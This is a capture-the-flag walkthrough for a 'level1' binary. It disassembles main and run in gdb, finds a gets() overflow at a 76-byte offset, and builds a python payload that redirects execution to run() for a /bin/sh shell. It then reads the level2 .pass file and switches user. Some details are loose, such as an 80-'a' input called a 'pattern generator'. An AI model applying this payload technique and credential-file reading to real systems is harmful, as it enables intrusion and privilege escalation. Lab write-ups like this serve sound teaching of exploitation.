
### 1. Understand what level1 binary do

**Listing Defined Functions (`info functions`)**:
``` code
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
```

- `main` at address `0x08048480`
- `gets`, `fwrite`, `system` (from the PLT, Procedure Linkage Table)
- Initialization and termination functions like `_init`, `_fini`, and others.

These functions correspond to standard library functions and program-specific functions like `main`, `run`, and initialization routines.

---

### 2. **Disassembly of `main` function**:
The `main` function is disassembled

```
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
```
- **Push `ebp` and Move `esp` to `ebp`**: 
  - The first two lines save the base pointer (`ebp`) of the previous function's stack frame and set up the base pointer for the current function’s stack frame.
  
```
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
```
- **Stack Alignment & Local Variable Allocation**:
  - The `and` instruction aligns the stack to a 16-byte boundary, which is required for some instructions to work properly.
  - The `sub` instruction allocates 80 bytes for local variables in the `main` function.

```
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
```
- **Setting up `gets()`**:
  - The `lea` instruction loads the effective address `esp+0x10` (pointing to local stack memory) into `eax`. This is the argument for `gets()`, which expects a pointer to a buffer.
  - The `call` instruction invokes the `gets()` function to read input into that buffer.

```
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```
- **Function Exit**:
  - The `leave` instruction cleans up the stack by restoring the previous `ebp` and `esp` values.
  - The `ret` instruction returns control to the calling function (the operating system in this case).

---

### 3. **Disassembly of `run` function**:
The `run` function is disassembled as shown in the code:

```
Dump of assembler code for function run:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
```
- **Push `ebp` and Move `esp` to `ebp`**: 
  - Similar to the `main` function, this sets up the stack frame for the `run` function.

```
   0x08048447 <+3>:     sub    esp,0x18
```
- **Allocate Local Variables**:
  - Allocates 24 bytes on the stack for local variables in the `run` function.

```
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
```
- **Setting up `fwrite()`**:
  - The instructions move values into registers (`eax`, `edx`) and prepare arguments for the `fwrite()` function.
  - The `fwrite()` function writes data (likely a string) to the standard output (`stdout`).

```
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>
```
- **Calling `system()`**:
  - The value `0x8048584` is likely the address of the string `"/bin/sh"`, and the `system()` function is called to execute that command (launching a shell).

```
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
```
- **Function Exit**:
  - Similar to `main`, the `leave` and `ret` instructions clean up the stack and return control to the caller.

---

### Stack Layout:
For both functions (`main` and `run`), the stack contains local variables, saved registers, and arguments for function calls. The explanations show the stack state before the `leave` and `ret` instructions, providing insight into how memory is allocated and deallocated for function execution. 

- The stack is used to store data such as function arguments, local variables, and saved registers (like `ebp` and `esp`).
- The **alignment** ensures that the stack pointer (`esp`) is properly aligned to a 16-byte boundary.
  
This assembly code, along with the analysis of stack usage, shows a simple program setup and function calling convention.


## Program Behavior

1. The `level1` program waits for user input.
2. It uses the `gets()` function to read the input from the user. The `gets()` function is vulnerable to buffer overflow because it does not check the length of the input.
3. The program has two key functions:
   - `main()`: Takes input using `gets()`.
   - `run()`: Displays a message "Good... Wait what?" and executes `/bin/sh` using `system()`.


### 2. Identify the Vulnerable Function

Using GDB, disassemble the program to locate the `main()` and `run()` functions. We want to find where the buffer overflow occurs and where the return address is stored.

To disassemble the `main()` function, use the following command:

```bash
(gdb) disas main
```

Look for the `gets()` call in the `main()` function. This is where the overflow will happen.

Next, find the address of the `run()` function:

```bash
(gdb) disas run
```

Note down the address of `run()`. For example, assume the address is `0x08048444`.

### 3. Find the Offset for Buffer Overflow

Now we need to find out how many bytes of input are required to overwrite the return address of `main()` and redirect it to the `run()` function.

We can do this using a pattern generator in Python to create a unique input pattern that will help us find the exact offset. First, generate a pattern of 80 characters:

```bash
python -c 'print "a" * 80' > /tmp/exploit
```

Now run the program in GDB with the generated input:

```bash
(gdb) r < /tmp/exploit
```

This will cause the program to crash due to the buffer overflow. The crash will show the value of the program counter (EIP) and help us determine the offset.

In GDB, you should see something like this:

```
Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

The value `0x61616161` corresponds to the character `'a'`. This means we’ve overflowed the buffer at 76 bytes, which is the exact offset where the return address is stored.

### 4. Craft the Exploit

Now that we know the offset (76 bytes), we can create the exploit.

The exploit consists of:
- **76 bytes of padding** (to fill the buffer).
- **The address of the `run()` function**, written in little-endian format.

Assume the address of `run()` is `0x08048444`. In little-endian format, this becomes `\x44\x84\x04\x08`.

Create the exploit:

```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
```
### 5. Execute the Exploit

Now, execute the exploit by piping the input into the `level1` program:

```bash
cat /tmp/exploit | ./level1
```

If everything works correctly, you should see the following output:

```
Good... Wait what?
```

This confirms that the `run()` function was executed and `/bin/sh` was launched.

### 6. Keep the Shell Open

Since `/bin/sh` is non-interactive and will exit immediately because of the EOF condition, we can use `cat` to keep the shell open:

```bash
cat /tmp/exploit - | ./level1
```

This will allow you to interact with the `/bin/sh` shell.

### 7. Gain Access to `level2`

Once you have a shell, you can check your current user by running:

```bash
whoami
```

You should see:

```
level2
```

Next, you can read the password for the `level2` user by reading the `.pass` file:

```bash
cat /home/user/level2/.pass
```

This will display the hashed password for `level2`.

### 8. Escalate to `level2`

Now that you have the password hash for `level2`, you can switch to the `level2` user using the `su` command:

```bash
su level2
Password: [hash from .pass]
```

This will give you access to the `level2` user.

### 9. Conclusion

By exploiting the buffer overflow vulnerability in the `level1` program, we were able to redirect execution to the `run()` function, which launched `/bin/sh`. With this shell, we escalated our privileges to `level2` and read the password hash for the `level2` user.




